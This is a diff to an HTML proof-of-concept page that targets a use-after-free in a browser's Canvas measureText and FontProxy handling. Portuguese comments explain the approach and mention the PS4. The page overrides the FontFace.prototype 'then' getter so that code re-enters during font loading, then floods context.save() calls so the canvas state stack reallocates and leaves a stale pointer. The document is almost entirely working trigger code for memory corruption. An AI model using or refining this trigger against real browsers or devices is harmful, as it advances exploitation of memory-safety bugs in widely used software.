@@ -3,28 +3,44 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>PoC - Canvas )</title>
+    <title>PoC - Canvas measureText FontProxy UAF (fe938b0)</title>
 </head>
 <body>
 <script>
-const canvas = document.createElement('canvas');
-const ctx = canvas.getContext('2d');
+  let face = new FontFace('MyTestFam', 'local(Helvetica)');
+  face.loaded;
+  document.fonts.add(face);
+  
+  let canvas = document.createElement('canvas');
+  canvas.width = 64;
+  canvas.height = 64;
+  canvas.style.cssText = 'position:absolute;left:-9999px';
+  document.body.appendChild(canvas);
+  
+  let context = canvas.getContext('2d');
+  context.save();
+  context.lineWidth = 0.5;
+  context.font = '10px MyTestFam';
+  
+  let reentered = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get() {
+      if (reentered)
+        return undefined;
+      reentered = true;
+      // Estoura a pilha de estados durante o carregamento síncrono/reentrante,
+      // forçando realocação e invalidando o ponteiro de FontProxy.
+      for (let i = 0; i < 18; i++) {
+        context.save();
+        context.lineWidth = 1 + i;
+      }
+      reentered = false;
+      return undefined;
+    }
+  });
 
-// Colocar um gradient no state atual (refcounted, vai para State)
-const grad = ctx.createLinearGradient(0, 0, 100, 0);
-grad.addColorStop(0, 'red');
-ctx.fillStyle = grad;  // → realizeSaves() → State copiado com RefPtr<CanvasGradient>
-
-// Acumular unrealized saves sem realizar
-// (não aciona realizeSaves — apenas incrementa o counter)
-// No PS4 não há MaxSaveCount, então isso só vai consumir memória quando realizar
-for (let i = 0; i < 1000; i++)
-    ctx.save();
-
-// Acionar realizeSaves() agora — com 1000 saves pendentes
-// → m_stateStack.append(state()) ×1000 → múltiplas reallocations
-// → cada reallocation é uma chance de self-reference issue
-ctx.lineWidth = 2;  // qualquer setter com realizeSaves()
+  context.measureText('a');
 </script>
 </body>
 </html>
